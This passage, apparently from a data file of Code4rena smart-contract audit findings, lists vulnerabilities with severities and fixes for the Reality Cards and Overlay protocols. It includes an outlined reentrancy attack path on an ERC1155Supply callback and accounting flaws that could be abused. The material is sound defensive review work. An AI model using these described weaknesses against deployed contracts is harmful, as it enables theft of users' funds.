        _newPrice = _removeBidFromOrderbookIgnoreOwner( _head.next, _market, _card );
        _loopCounter++;             // delete next bid if foreclosed
    } while (    treasury.foreclosureTimeUser( _head.next, _newPrice,  _timeOwnershipChanged ) <  minimumTimeToOwnTo &&
            _loopCounter < maxDeletions );

    if (_loopCounter != maxDeletions) {   // the old owner is dead, long live the new owner
        _newOwner = ....
        ...
    } else {
        // we hit the limit, save the old owner, we'll try again next time
        ...
    }
}
```

Recommend using a different way to determine that the processing is done. This could save some gas.
Note: the additional check also costs gas, so you have to verify the end result.

Perhaps in `setDeletionLimit`, doublecheck that `_deletionLimit` > 1."
26.md,`UberOwner` has too much power,high,"The Uber Owner has too much power within the system. This makes the protocol closer to a centralized prediction market whose rules are determined by the Uber Owner. See issue page for referenced code

The above functions can be used by the Uber Owner to completely change the functionality of the system.
This goes well beyond simple setting new constants and fees, the Uber Owner can basically reprogram how the entire protocol works. Not to mention if the address falls into the wrong hands.

Recommend limiting the permission of the Uber Owner to something more manageable and trustable. If upgrades to underlying contracts are required they can be done through a proxy instead, in the standard way."
26.md,Uninitialized Variable `marketWhitelist` in `RCTreasury.sol`,medium,"The variable, `marketWhitelist`, is never initialized in the contract `RCTreasury.sol`. As a result, the function `marketWhitelistCheck()`  does not perform a proper check on whitelisted users for a restricted market. Additionally, the function will always return `true`, even if a market wishes to restrict its users to a specific role.

The initial state variable is defined in [`RCTreasury.sol` L75](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L75).


The state variable `marketWhitelist` is accessed in the function `RCTreasury.marketWhitelistCheck()` at [`RCTreasury.sol` L269-L281](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L269-L281).

The function `RCTreasury.marketWhitelistCheck()` is called in `RCMarket.newRental()` at [`RCMarket.sol` L758-L761](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L758-L761). The comment indicates that there should be some ability to restrict certain markets to specific whitelists, however, there are no methods in `RCTreasury` that allow a market creator to enable this functionality.

Recommend ensuring this behavior is intended. If this is not the case, consider adding a function that enables a market creator to restrict their market to a specific role by whitelisting users."
26.md,Parameter updates not propagated,medium,"There are several functions to update parameters. However these parameters are only updated on the top level and not propagated to the other contracts. This could lead to various unpredictable results.
Examples are:
- `setNftHubAddress` of `RCFactory`
- `setOrderbookAddress` of `RCFactory`
- `setLeaderboardAddress` of `RCFactory`
- `setMinRental` of `RCTreasury`

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L586
function setNftHubAddress(IRCNftHubL2 _newAddress) external override onlyUberOwner {
    require(address(_newAddress) != address(0), ""Must set Address"");
    nfthub = _newAddress;
}

function setOrderbookAddress(IRCOrderbook _newOrderbook) external override {
    require( treasury.checkPermission(TREASURY, msgSender()), ""Not approved"" );
    orderbook = _newOrderbook;
}

function setLeaderboardAddress(IRCLeaderboard _newLeaderboard) external override {
    require( treasury.checkPermission(TREASURY, msgSender()), ""Not approved"");
    leaderboard = _newLeaderboard;
}

//https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L188
function setMinRental(uint256 _newDivisor) public override onlyRole(OWNER) {
    minRentalDayDivisor = _newDivisor;
}
```

Recommend implementing a way to notify the underlying contracts of the updates."
26.md,Deposits don't work with fee-on transfer tokens,medium,"There are ERC20 tokens that may make certain customizations to their ERC20 contracts.
One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.
Others are rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time).

The `RCTreasury.deposit()` function will credit more deposits than the contract actually received:

```solidity
erc20.safeTransferFrom(msgSender(), address(this), _amount);
user[_user].deposit += SafeCast.toUint128(_amount);
```

Recommend ensuring that the `erc20` token does not implement any customizations.
Alternatively, a mitigation is to measure the asset change right before and after the asset-transferring routines"
26.md,Can't retrieve all data with `getMarketInfo`,low,"The function `getMarketInfo` of `RCFactory` only can give results back in the range 0...`marketInfoResults`
Supplying `_skipResults` doesn't help, it then just skips the first `_skipResults`  records.

Assume `marketInfoResults` == 10 and `_skipResults` == 20:
Then no result will be given back because ""`_resultNumber` < `marketInfoResults`"" will never allow `_resultNumber`  to be bigger than 10

Note: this is low risk because `getMarketInfo` is a backup function (although you maybe want the backup to function as expected)

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L227
function getMarketInfo( IRCMarket.Mode _mode, uint256 _state, uint256 _skipResults  )  external view
    returns ( address[] memory, string[] memory, string[] memory, uint256[] memory ) {
    ..
    uint256 _resultNumber = 0;
    ..
    while (_resultNumber < marketInfoResults && _marketIndex > 1) {
        ...
            if (_resultNumber < _skipResults) {
                _resultNumber++;
            } else {
                _marketAddresses[_resultNumber] = _market;   // will never reach this part if _skipResults >= marketInfoResults
                ....
                _resultNumber++;
            }
        }
    }
    return (_marketAddresses, _ipfsHashes, _slugs, _potSizes);
```

Recommend updating the code to something like the following:
```solidity
uint idx;
while (idx < marketInfoResults && _marketIndex > 1) {
    _marketIndex--;
    address _market = marketAddresses[_mode][_marketIndex];
    if (IRCMarket(_market).state() == IRCMarket.States(_state)) {
        if (_resultNumber < _skipResults) {
            _resultNumber++;
        } else {
            _marketAddresses[idx] = _market;
            _ipfsHashes[idx] = ipfsHash[_market];
            _slugs[idx] = addressToSlug[_market];
            _potSizes[idx] = IRCMarket(_market).totalRentCollected();
            idx++;
        }
    }
}
```"
26.md,Return value of `erc20.approve` is unchecked,low,"The `SafeERC20` library is used in the `RCTreasury` contract to handle the transfer of tokens that are not compliant with the ERC20 specification. However, in [line 347](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L347), the `approve` function is used instead of the `safeApprove` function. Tokens not compliant with the ERC20 specification could return `false` from the `approve` function call to indicate the approval fails, while the calling contract would not notice the failure if the return value is not checked.

Recommend using the `safeApprove` function instead, which reverts the transaction with a proper error message when the return value of `approve` is `false`. A better approach is to use the `safeIncreaseAllowance` function, which mitigates the multiple withdrawal attack on ERC20 tokens."
26.md,Direct usage of `ecrecover` allows signature malleability,low,"The `verify` function of `NativeMetaTransaction` calls the Solidity `ecrecover` function directly to verify the given signature. However, the `ecrecover` EVM opcode allows for malleable (non-unique) signatures and thus is susceptible to replay attacks. Although a replay attack on this contract is not possible since each user's nonce is used only once, rejecting malleable signatures is considered a best practice.
* [NativeMetaTransaction.sol#L97](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/lib/NativeMetaTransaction.sol#L97)
* [SWC-117: Signature Malleability](https://swcregistry.io/docs/SWC-117)
* [SWC-121: Missing Protection against Signature Replay Attacks](https://swcregistry.io/docs/SWC-121)

Recommend using the `recover` function from [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) for signature verification."
26.md,Return Value is Not Validated,low,"The `circuitBreaker()` function in `RCMarket.sol` is utilised in the event an oracle never provides a response to a RealityCards question. The function makes an external call to the `RCOrderbook.sol` contract through the `closeMarket()` function. If for some reason the orderbook was unable to be closed, this would never be checked in the `circuitBreaker()` function. See [`RCMarket.sol` L1215-L1223](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L1215-L1223).

Recommend ensuring this is intended behavior, or otherwise validate the response of `orderbook.closeMarket()`. Another option would be to emit the result of the external call in the `LogStateChange` event, alongside the state change."
26.md,External Call Made Before State Change,low,"There are a number of functions in `RCTreasury.sol` which make external calls to another contract before updating the underlying market balances. More specifically, these affected functions are `deposit()`, `sponsor()`, and `topupMarketBalance()`. As a result, these functions would be prone to reentrancy exploits. However, as `safeTransferFrom()` operates on a trusted ERC20 token (RealityCard's token), this issue is of low severity. See issue page for reference code.

Recommend modifying the aforementioned functions such that all state changes are made before a call to the ERC20 token using the `safeTransferFrom()` function."
26.md,Test Coverage Improvements,low,"Adequate test coverage and regular reporting is an essential process in ensuring the codebase works as intended. Insufficient code coverage may lead to unexpected issues and regressions arising due to changes in the underlying smart contract implementation.

![](https://i.imgur.com/Seur7Fg.png)

Image above showcases total test coverage of the target contracts.

Recommend ensuring the coverage report produced via `npx hardhat coverage` covers all functions within Reality Card's smart contract suite."
26.md,`RCFactory`: Solve stack too deep for `getMarketInfo()`,low,"The `marketInfoResults` is a parameter used by `getMarketInfo()` to determine the length of results to return. As the `setMarketInfoResults()` comments state, ""(it) would be better to pass this as a parameter in `getMarketInfo`.. however we are limited because of stack too deep errors"".

This limitation can be overcome by defining the return array variables as the function output, as suggested below.

The need for `marketInfoResults` and its setter function is then made redundant, whilst making querying results of possibly varying lengths more convenient.

Recommend the following:

```jsx
function getMarketInfo(
  IRCMarket.Mode _mode,
  uint256 _state,
  uint256 _skipResults,
  uint256 _numResults // equivalent of marketInfoResults
)
  external
  view
  returns (
    address[] memory _marketAddresses,
    string[] memory _ipfsHashes,
    string[] memory _slugs,
    uint256[] memory _potSizes
	)
 {
	  uint256 _marketIndex = marketAddresses[_mode].length;

	  _marketAddresses = new address[](_numResults);
	  _ipfsHashes = new string[](_numResults);
	  _slugs = new string[](_numResults);
	  _potSizes = new uint256[](_numResults);
		...
}
```"
26.md,`RCFactory`: Do multiplication instead of division for length checks,low,"Solidity division rounds down, so doing `M / 2 <= N` checks mean that `M` can be at most `2N + 1`.

This affects the following checks:

```jsx
require(
	(_tokenURIs.length / 2) <= cardLimit,
	""Too many tokens to mint""
);

require(
  _cardAffiliateAddresses.length == 0 ||
	  _cardAffiliateAddresses.length == (_tokenURIs.length / 2),
  ""Card Affiliate Length Error""
)
```

Note that with the current implementation, if `_tokenURIs` is of odd length, its last element will be  redundant, but market creation will not revert.

The stricter checks will partially mitigate `_tokenURIs` having odd length because `_cardAffiliateAddresses` is now required to be exactly twice that of `_tokenURIs`.

These checks should be modified to:

```jsx
require(
	_tokenURIs.length <= cardLimit * 2,
	""Too many tokens to mint""
);

require(
  _cardAffiliateAddresses.length == 0 ||
	  _cardAffiliateAddresses.length * 2 == _tokenURIs.length,
  ""Card Affiliate Length Error""
);
```

In addition, consider adding a check for `_tokenURIs` to strictly be of even length.

`require(_tokenURIs.length % 2 == 0, ""TokenURI Length Error"");`"
26.md,safer implementation of `tokenExists`,low,"The function `tokenExists` does only limited checks on the existence of cards.
It doesn't doublecheck that `tokenIds[_card]` != 0
This is relevant because 0 is the default value of empty array elements. Although this isn't a problem in the current code,
future changes might accidentally introduce vulnerabilities.

Also cards are only valid if they are below `numberOfCards`. This has led to vulnerabilities in previous versions of the contract
(e.g. previous contest)

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L1139
function tokenExists(uint256 _card) internal view returns (bool) {
        return tokenIds[_card] != type(uint256).max;
}
```

Recommend changing the function to something like the following:
```solidity
function tokenExists(uint256 _card) internal view returns (bool) {
    if (_cardId >= numberOfCards) return false;
    if (tokenIds[_card] == 0) return false;
    return tokenIds[_card] != type(uint256).max;
}
```"
26.md,`uint32` conversion doesn't work as expected.,low,"The `uint32` conversion in `setWinner` of the `RCMarket` doesn't work as expected.
The first statement: ""`uint32(block.timestamp)`"" already first the `block.timestamp` in a `uint32`.
If it is larger than `type(uint32).max` it wraps around and starts with 0 again
The testcode below shows this.

Check for ""`<= type(uint32).max`"" in the second statement is useless because `_blockTimestamp` is always  <= `type(uint32).max`

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L507
 function setWinner(uint256 _winningOutcome) internal {
...
    uint256 _blockTimestamp = uint32(block.timestamp);
    require(_blockTimestamp <= type(uint32).max, ""Overflow"");


//Testcode:
pragma solidity 0.8.7;
contract Convert {
   uint256 public a = uint256( type(uint32).max )+1; // a==4294967296
   uint32  public b = uint32(a); // b==0
   uint256 public c = uint32(a); // c==0
}
```

Recommend doing the `require` first (without a typecast to `uint32`):
```solidity
    require( block.timestamp <= type(uint32).max, ""Overflow"");
    uint256 _blockTimestamp = uint32(block.timestamp);
```"
26.md,`msgSender()` or `_msgSender()`,low,"The code has two implementations of `msgSender`:
-   `msgSender()` => uses meta transaction signer
-  `_msgSender()` => maps to `msg.sender`

`_msgSender()` is used in a few locations
- when using `_setupRole`, this seems legitimate
- in function `withdraw` (whereas the similar function `withdrawWithMetadata` uses `msgSender()` )

It is confusing to have multiple functions with almost the same name, this could easily lead to mistakes.

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/lib/NativeMetaTransaction.sol#L105
function msgSender() internal view returns (address payable sender) {
    if (msg.sender == address(this)) {
        assembly {   sender := shr(96, calldataload(sub(calldatasize(), 20)))   }
    } else {
            sender = payable(msg.sender);
    }
    return sender;
}
```
```solidity
// https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Context.sol
function _msgSender() internal view virtual returns (address) {
    return msg.sender;
}
```
```solidity
//https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/nfthubs/RCNftHubL2.sol#L164
function withdraw(uint256 tokenId) external override {
    require(  _msgSender() == ownerOf(tokenId), ""ChildMintableERC721: INVALID_TOKEN_OWNER"" ); // _msgSender()
    withdrawnTokens[tokenId] = true;
    _burn(tokenId);
}
```
```solidity
function withdrawWithMetadata(uint256 tokenId) external override {
    require( msgSender() == ownerOf(tokenId), ""ChildMintableERC721: INVALID_TOKEN_OWNER"" );  // msgSender()
    withdrawnTokens[tokenId] = true;
    // Encoding metadata associated with tokenId & emitting event
    emit TransferWithMetadata( ownerOf(tokenId), address(0), tokenId, this.encodeTokenMetadata(tokenId) );
    _burn(tokenId);
}
```
```solidity
RCNftHubL1.sol:      _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
RCNftHubL2.sol:      _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
RCTreasury.sol:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());
RCTreasury.sol:        _setupRole(UBER_OWNER,               _msgSender());
RCTreasury.sol:        _setupRole(OWNER,                         _msgSender());
RCTreasury.sol:        _setupRole(GOVERNOR,                   _msgSender());
RCTreasury.sol:        _setupRole(WHITELIST,                    _msgSender());
```

Recommend double-checking the use of  `_msgSender()` in withdraw and adjust if necessary. Also, adding comments when using  `_msgSender()`. And finally consider overriding `_msgSender()`, as is done in the example [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/metatx/ERC2771Context.sol):"
26.md,`rentAllCards`: don't have to pay for card you already own,low,"The function `rentAllCards` of `RCMarket` checks for `_maxSumOfPrices` to see you are not paying more that you want.

However, the first part of the calculations (which calculate `_actualSumOfPrices` ), do not take in account the fact that you might
already own a card. (while the second part of the code does). If you already own the card you don't have to pay for it and you certainly don't have to pay the extra `minimumPriceIncreasePercent`.

The code at ""Proof of Concept"" shows a refactored version of the code (see other issue ""make code of `rentAllCards` easier to read"").
This immediately shows the issue.

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L691 ==> simplified version
function calc(uint256 currentPrice) returns(uint256) {
    if (currentPrice == 0)
        return MIN_RENTAL_VALUE;
    return (currentPrice *(minimumPriceIncreasePercent + 100)) / 100;
}

function rentAllCards(uint256 _maxSumOfPrices) external override {
    ..
    uint256 _actualSumOfPrices = 0;
    for (uint256 i = 0; i < numberOfCards; i++) {
        _actualSumOfPrices += calc(card[i].cardPrice);   // no check for  (ownerOf(i) != msgSender()) {
    }
    require(_actualSumOfPrices <= _maxSumOfPrices, ""Prices too high"");

    for (uint256 i = 0; i < numberOfCards; i++) {
        if (ownerOf(i) != msgSender()) {
            uint256 _newPrice=calc(card[i].cardPrice);
            newRental(_newPrice, 0, address(0), i);
        }
    }
}
```

Add ""`if (ownerOf(i) != msgSender()) {`"" also in the first part of the code of `rentAllCards`
```solidity
uint256 _actualSumOfPrices = 0;
for (uint256 i = 0; i < numberOfCards; i++) {
    if (ownerOf(i) != msgSender()) {              // extra if statement
        _actualSumOfPrices += calc(card[i].cardPrice);
    }
}
```"
26.md,`getMostRecentMarket` can revert,low,"The function `getMostRecentMarket` of `RCFactory.sol` will revert if no markets of the specific mode are created yet.

```solidity
// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L171
function getMostRecentMarket(IRCMarket.Mode _mode)  external view override  returns (address)
{
    return marketAddresses[_mode][marketAddresses[_mode].length - (1)];
}
```

Recommend changing the function `getMostRecentMarket` to something like:
```solidity
function getMostRecentMarket(IRCMarket.Mode _mode)  external view override  returns (address) {
    if ( marketAddresses[_mode].length ==0) return address(0);
    return marketAddresses[_mode][marketAddresses[_mode].length - (1)];
}
```"
26.md,`updateTokenURI` doesn't call `setTokenURI`,low,"The function `updateTokenURI` of `RCFactory.sol` doesn't update the uris of `RCNftHubL2`.
E.g. it doesn't call `setTokenURI` to try and update the already created NFT's.
This way the URIs of already minted tokens are not updated.

See issue page for referenced code.

Recommend also calling `setTokenURI` of `RCNftHubL2`. Or, restricting `updateTokenURI` to the phase where no NFT's are minted yet. Or, at least add comments to `updateTokenURI`."
26.md,"`RCTreasury`: `AccessControl` diagram contains Leaderboard, but it has no role",low,See issue page for diagram and discussion.
26.md,`RCLeaderboard.market` storage variable is not used,low,"The `RCLeaderboard.market` storage variable is never used. Instead, the `MARKET` role seems to be used to implement authentication.

Unused code can hint at programming or architectural errors.

Recommend using it or remove it."
26.md,Markets can start in the past,low,"The `RCFactory._checkTimestamps` function only checks that the start timestamp (`_timestamps[0]`) is not in the past if `advancedWarning != 0`.

Markets can be created that already started in the past. I'm not sure if this is intended.

Recommend always performing the `require(_timestamps[0] >= block.timestamp, ""Market opening time not set"");` check, not only in the `advancedWarning != 0` case."
26.md,add zero address validation in constructor,low,"since the parameter in the constructor are used to initialize the state variable , proper check up should be done , other wise error in these state variable  can lead to redeployment of contract. See issue page for referenced code.

Recommend adding zero address validation."
26.md,use of array without checking its length,low,"Since no limit is mentioned in `batchWhitelist()` for the input of `_users` array , it may run out of gas if array length become large. See [`RCTreasury.sol` L249](https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L249).

Recommend adding a limitation for which , this number of address can be whitelisted at a time."
26.md,No check for the `referenceContractAddress` in `createMarket()`,low,"`referenceContractAddress` is used in `createMarket()` to create `newAddress`  for the market , a necessary check should be there that `referenceContractAddress` exist or not, because if `createMarket()` is called before `setReferenceContractAddress()`, `address(0)` will be passed as `referenceContractAddress` , since `addMarket()` of `treasury` and `nfthub` does not have address validation for the market. See [`RCFactory.sol` L714](https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCFactory.sol#L714).

Recommend adding a condition to check the `referenceContractAddress`"
26.md,no time restriction in `setMarketTimeRestrictions`(),low,"As mentioned in the comment, time must be at least this many seconds, but it lack a check that given time is `atleast >= someTime` , as a result
 `minimumDuration` and `maximumDuration` are directly initialized without any check. See [`RCFactory.sol` L431](https://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCFactory.sol#L431).

Recommend adding require condition to check those value before setting it."
26.md,`transferCard` should be done after treasury is updated.,low,"When the current owner of the card is still the new owner of the card, `transferCard` is called before the treasury is updated. While this does not currently pose a risk, it is not aligned with best practices of [check-effect-interations](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) and opens your code to a potential re-entrancy attack in the future.

```jsx
// line 381
treasury.updateRentalRate(
    _oldOwner,
    _user,
    user[_oldOwner][index[_oldOwner][_market][_card]].price,
    _price,
    block.timestamp
);
transferCard(_market, _card, _oldOwner, _user, _price);
...
// line 449
treasury.updateRentalRate(
    _user,
    _user,
    _price,
    _currUser.price,
    block.timestamp
);
transferCard(_market, _card, _user, _user, _currUser.price);
```"
26.md,Inaccurate Comment,low,"This issue has no direct security implications, however, there may be some confusion when understanding what the `RCFactory.createMarket()` function actually does. See [`RCFactory.sol` L625](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L625).

Recommend updating the line (linked above) to include the `SAFE_MODE` option outline in the `enum` type in `IRCMarket.sol`. For example, the line `/// @param _mode 0 = normal, 1 = winner takes all` could be updated to `/// @param _mode 0 = normal, 1 = winner takes all, 2 = SAFE_MODE`"
26.md,`RCLeaderboard`: Erroneous comment,low,"The comments above the event declarations were probably copied over from `RCOrderbook`. They should be modified to refer to the leaderboard.

```jsx
/// @dev emitted every time a user is added to the leaderboard
event LogAddToLeaderboard(address _user, address _market, uint256 _card);
/// @dev emitted every time a user is removed from the leaderboard
event LogRemoveFromLeaderboard(
    address _user,
    address _market,
    uint256 _card
);
```"
26.md,Use `_safeTransfer` when transferring NFTs,low,"The `transferNft` function of `RCNftHubL2` is called when transferring the card to the final winner. However, this function does not check whether the recipient is aware of the ERC721 protocol and calls `_transfer` directly. If the recipient is a contract not aware of incoming NFTs, then the transferred NFT would be locked in the recipient forever. See [`RCNftHubL2.sol` L135](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/nfthubs/RCNftHubL2.sol#L135).

Recommend using the [`_safeTransfer`]((https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L205-L213)) function instead, which checks if the recipient contract implements the `onERC721Received` interface to avoid loss of NFTs."
49.md,`OverlayV1UniswapV3Market` computes wrong market liquidity,high,"The `OverlayV1UniswapV3Market.fetchPricePoint` tries to compute the market depth in OVL terms as `marketLiquidity (in ETH) / ovlPrice (in ETH per OVL)`.
To get the market liquidity *in ETH* (and not the other token pair), it uses the `ethIs0` boolean.

```solidity
_marketLiquidity = ethIs0
    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice
    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);
```

However, `ethIs0` boolean refers to the `ovlFeed`, whereas the `_liquidity` refers to the `marketFeed`, and therefore the `ethIs0` boolean has nothing to do with the *market* feed where the liquidity is taken from:

```solidity
// in constructor, if token0 is eth refers to ovlFeed
ethIs0 = IUniswapV3Pool(_ovlFeed).token0() == _eth;

// in fetchPricePoint, _liquidity comes from different market feed
( _ticks, _liqs ) = IUniswapV3Pool(marketFeed).observe(_secondsAgo);
_marketLiquidity = ethIs0
    ? ( uint256(_liquidity) << 96 ) / _sqrtPrice
    : FullMath.mulDiv(uint256(_liquidity), _sqrtPrice, X96);
```

#### Impact

If the `ovlFeed` and `marketFeed` do not have the same token position for the ETH pair (ETH is either token 0 or token 1 for **both** pairs), then the market liquidity & depth is computed wrong (inverted).
For example, the `OverlayV1Market.depth()` function will return a wrong depth which is used in the market cap computation.

#### Recommended Mitigation Steps

It seems that `marketFeed.token0() == WETH` should be used in `fetchPricePoint` to compute the liquidity instead of `ovlFeed.token0() == WETH`."
49.md,OZ ERC1155Supply vulnerability,high,"#### Impact

Overlay uses OZ contracts version 4.3.2:

```yaml
  dependencies:
    - OpenZeppelin/openzeppelin-contracts@4.3.2
```

and has a contract that inherits from ERC1155Supply:

```solidity
  contract OverlayV1OVLCollateral is ERC1155Supply
```

This version has a recently discovered vulnerability:
<https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-wmpv-c2jp-j2xg>

In your case, function unwind relies on totalSupply when calculating `\_userNotional`, `\_userDebt`, `\_userCost`, and `\_userOi`, so a malicious actor can exploit this vulnerability by first calling 'build' and then on callback 'unwind' in the same transaction before the total supply is updated.

#### Recommended Mitigation Steps

Consider updating to a patched version of 4.3.3."
49.md,isUnderwater returns opposite boolean for short positions,medium,"#### Impact

The function `isUnderwater` should return true if the position value is < 0. In the case of a short position, this is when oi \* (2 - priceFrame) - debt < 0 (based on the logic given in the \_value function). Rearranging this equation, a short position is underwater if oi \* 2 < oi \* priceFrame + debt. However, in the function `\_isUnderwater` in Position.sol, the left and right side of this equation is flipped, meaning that the function will return the opposite of what it should when called on short positions.

Fortunately, the V1 implementation of `OverlayOVLCollateral` does not directly use the `isUnderwater` function in major control flow changes. However, line 304 of OverlayV1OVLCollateral.sol is a comment that says:

// TODO: think through edge case of underwater position ... and fee adjustments ...

which hints that this function is going to be used to deal with underwater positions. As a result, this issue would have a huge impact if not properly dealt with.

#### Proof of Concept

See code for `\_isUnderwater` here: <https://github.com/code-423n4/2021-11-overlay/blob/1833b792caf3eb8756b1ba5f50f9c2ce085e54d0/contracts/libraries/Position.sol#L70>

Notice that for short positions the inequality is flipped from what it should be (indeed, when self.debt is higher it is more likely that `isUnder` will be false, which is obviously incorrect).

Also, see the TODO comment here that shows `isUnderwater` is important: <https://github.com/code-423n4/2021-11-overlay/blob/1833b792caf3eb8756b1ba5f50f9c2ce085e54d0/contracts/collateral/OverlayV1OVLCollateral.sol#L304>

#### Tools Used

Inspection

#### Recommended Mitigation Steps

Flip the left and right side of the inequality for short positions in `\_isUnderwater`."
49.md,pow() is missing check on input parameters with 0 value,medium,"#### Impact

The contract LogExpMath.sol seems to be a fork of the balancer LogExpMath.sol contract.
It is mostly similar, except for checks for x and y being 0 in the beginning of the function `pow()`, see below.

This omission might lead to unexpected results.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/libraries/LogExpMath.sol#L93-L110>

```JS
 function pow(uint256 x, uint256 y) internal pure returns (uint256) {
        unchecked {
        _require(x < 2**255, Errors.X_OUT_OF_BOUNDS);
```

<https://github.com/balancer-labs/balancer-v2-monorepo/blob/master/pkg/solidity-utils/contracts/math/LogExpMath.sol#L93-L109>

```JS
function pow(uint256 x, uint256 y) internal pure returns (uint256) {
    if (y == 0) {
        // We solve the 0^0 indetermination by making it equal one.
        return uint256(ONE_18);
    }

    if (x == 0) {
        return 0;
    }      
    _require(x < 2**255, Errors.X_OUT_OF_BOUNDS);
```

#### Recommended Mitigation Steps

Check if the extra code of the balance contract is useful and if so add it."
49.md,Can't enableCollateral after a disableCollateral,medium,"#### Impact

The function `disableCollateral` of OverlayV1Mothership.sol doesn't set `collateralActive\[\_collateral] = false;`
But it does revoke the roles.

Now `enableCollateral`  can never be used because `collateralActive\[\_collateral] ==true`  and it will never pass the second require.
So you can never grant the roles again.

Note: `enableCollateral` also doesn't set `collateralActive\[\_collateral] = true`

#### Proof of Concept

<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/mothership/OverlayV1Mothership.sol#L133-L153>

```JS
function enableCollateral (address _collateral) external onlyGovernor {
    require(collateralExists[_collateral], ""OVLV1:!exists"");
    require(!collateralActive[_collateral], ""OVLV1:!disabled"");
    OverlayToken(ovl).grantRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);
    OverlayToken(ovl).grantRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);
}

function disableCollateral (address _collateral) external onlyGovernor {
    require(collateralActive[_collateral], ""OVLV1:!enabled"");
    OverlayToken(ovl).revokeRole(OverlayToken(ovl).MINTER_ROLE(), _collateral);
    OverlayToken(ovl).revokeRole(OverlayToken(ovl).BURNER_ROLE(), _collateral);
}
```

#### Recommended Mitigation Steps

In function `enableCollateral()` add the following (after the require):
`collateralActive\[\_collateral] = true;`

In function `disableCollateral` add the following (after the require):
`collateralActive\[\_collateral] = false;`"
49.md,_totalSupply not updated in _transferMint() and _transferBurn(),medium,"#### Impact

The functions `\_transferMint()` and `\_transferBurn()` of OverlayToken.sol don't update `\_totalSupply`.
Whereas the similar functions `\_mint()` and `\_burn()` do update `\_totalSupply`.

This means that `\_totalSupply` and `totalSupply()` will not show a realistic view of the total OVL tokens.

For the protocol itself it isn't such a problem because this value isn't used in the protocol (as far as I can see).
But other protocols building on Overlay may use it, as well as user interfaces and analytic platforms.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L349-L364>

```js
function _mint( address account, uint256 amount) internal virtual {
   ...
      _totalSupply += amount;
```

https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L376-L395

```js
function _burn(address account, uint256 amount) internal virtual {
   ...
        _totalSupply -= amount;

https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L194-L212

https://github.com/code-423n4/2021-11-overlay/blob/914bed22f190ebe7088194453bab08c424c3f70c/contracts/ovl/OverlayToken.sol#L268-L286
```

## Recommended Mitigation Steps
Update `_totalSupply`  in `_transferMint()` and `_transferBurn()`"
49.md,Fee double counting for underwater positions,medium,"#### Impact

Actual available fees are less than recorded. That's because a part of them corresponds to underwater positions, and will not have the correct amount stored with the contract: when calculation happens the fee is recorded first, then there is a check for position health, and the funds are channeled to cover the debt firsthand. This way in a case of unfunded position the fee is recorded, but cannot be allocated, so the fees accounted can be greater than the value of fees stored.

This can lead to fee withdrawal malfunction, i.e. `disburse()` will burn more and attempt to transfer more than needed. This leads either to inability to withdraw fees when disburse is failing due to lack of funds, or funds leakage to fees and then inability to perform other withdrawals because of lack of funds.

#### Proof of Concept

The fees are accounted for before position health check and aren't corrected thereafter when there is a shortage of funds.

<https://github.com/code-423n4/2021-11-overlay/blob/main/contracts/collateral/OverlayV1OVLCollateral.sol#L311>

#### Recommended Mitigation Steps

Adjust fees after position health check: accrue fees only on a remaining part of position that is available after taking debt into account.

Now:
```solidity
uint _feeAmount = _userNotional.mulUp(mothership.fee());

uint _userValueAdjusted = _userNotional - _feeAmount;
if (_userValueAdjusted > _userDebt) _userValueAdjusted -= _userDebt;
else _userValueAdjusted = 0;
```
To be:
```solidity
uint _feeAmount = _userNotional.mulUp(mothership.fee());

uint _userValueAdjusted = _userNotional - _feeAmount;
